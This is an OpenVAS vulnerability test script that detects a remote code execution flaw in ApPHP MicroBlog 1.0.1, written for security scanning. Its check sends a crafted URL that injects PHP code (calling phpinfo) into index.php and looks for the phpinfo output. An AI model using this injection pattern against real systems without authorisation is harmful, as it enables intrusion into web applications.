###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apphp_rce_05_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
#
# ApPHP MicroBlog Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.105020";

tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
commands in the context of the affected application.";

tag_affected = "ApPHP MicroBlog 1.0.1";
tag_summary = "ApPHP MicroBlog is prone to a remote code execution vulnerability.";
tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Send a special crafted HTTP GET request and chech the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 2780 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("ApPHP MicroBlog Remote Code Execution Vulnerability");


 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33070/");
 
 script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
 script_tag(name:"creation_date", value:"2014-05-08 12:48:21 +0200 (Thu, 08 May 2014)");
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port( default:80 );
if( ! get_port_state( port ) ) exit( 0 );

if( ! can_host_php( port:port ) ) exit( 0 );

dirs = make_list( "/blog", cgi_dirs());

foreach dir ( dirs )
{
  url = dir + '/index.php';

  if( http_vuln_check( port:port, url:url, pattern:"ApPHP MicroBlog" ) )
  {
    url = dir + "/index.php?b);phpinfo();echo(base64_decode('T3BlblZBUwo')=/";
    if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) )
    {  
      report = report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }  
  }
}

exit(0);

